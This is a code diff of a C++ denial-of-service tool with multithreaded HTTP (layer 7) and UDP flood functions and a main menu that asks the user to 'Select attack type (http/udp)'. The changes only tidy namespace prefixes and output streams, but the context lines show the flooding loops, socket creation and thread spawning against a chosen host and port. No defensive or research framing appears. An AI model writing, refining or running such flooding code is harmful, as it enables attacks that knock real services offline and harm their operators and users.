@@ -74,7 +74,7 @@ int cs_http(const string& remote, int port) {
     hints.ai_family = AF_INET;
     hints.ai_socktype = SOCK_STREAM;
 
-    if (getaddrinfo(remote.c_str(), std::to_string(port).c_str(), &hints, &result) != 0) {
+    if (getaddrinfo(remote.c_str(), to_string(port).c_str(), &hints, &result) != 0) {
         cout << "getaddrinfo failed\n";
         close(sock);
         return -1;
@@ -91,7 +91,7 @@ int cs_http(const string& remote, int port) {
     return sock;
 }
 
-void sr_http(int maxRequests, const std::string& host, int port, int time) {
+void sr_http(int maxRequests, const string& host, int port, int time) {
     int sock;
     string packet;
     string randSeed = grs(30);
@@ -101,7 +101,7 @@ void sr_http(int maxRequests, const std::string& host, int port, int time) {
     while (chrono::steady_clock::now() < endTime) {
         sock = cs_http(host, port);
         if (sock < 0) {
-            this_thread::sleep_for(std::chrono::seconds(1));
+            this_thread::sleep_for(chrono::seconds(1));
             continue;
         }
 
@@ -130,7 +130,7 @@ void l7_http(const string& url, int port, int maxThreads, int time) {
         host = host.substr(0, pos);
     }
 
-    vector<std::thread> threads;
+    vector<thread> threads;
     for (int i = 0; i < maxThreads; ++i) {
         threads.emplace_back(sr_http, maxThreads, host, port, time);
     }
@@ -164,7 +164,7 @@ void sr_udp(const string& ip, int port, int maxRequests, int time) {
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(port);
     if (inet_pton(AF_INET, ip.c_str(), &serverAddr.sin_addr) <= 0) {
-        std::cerr << "Invalid IP address\n";
+        cout << "Invalid IP address\n";
         return;
     }
 
@@ -188,13 +188,13 @@ void sr_udp(const string& ip, int port, int maxRequests, int time) {
         }
 
         close(sock);
-        this_thread::sleep_for(std::chrono::milliseconds(50)); // Throttle if needed
+        this_thread::sleep_for(chrono::milliseconds(50)); // Throttle if needed
     }
 }
 
 void udpFlood(const string& ip, int port, int maxThreads, int time) {
 
-    vector<std::thread> threads;
+    vector<thread> threads;
     for (int i = 0; i < maxThreads; ++i) {
         threads.emplace_back(sr_udp, ip, port, maxThreads, time);
     }
@@ -210,13 +210,13 @@ void udpFlood(const string& ip, int port, int maxThreads, int time) {
 }
 
 int main() {
-    srand(static_cast<unsigned>(std::time(nullptr)));
+    srand(static_cast<unsigned>(time(nullptr)));
 
     string choice;
     cout << "Select attack type (http/udp): ";
     cin >> choice;
 
-    auto startTime = std::chrono::steady_clock::now();
+    auto startTime = chrono::steady_clock::now();
 
     if (choice == "http") {
         string url;
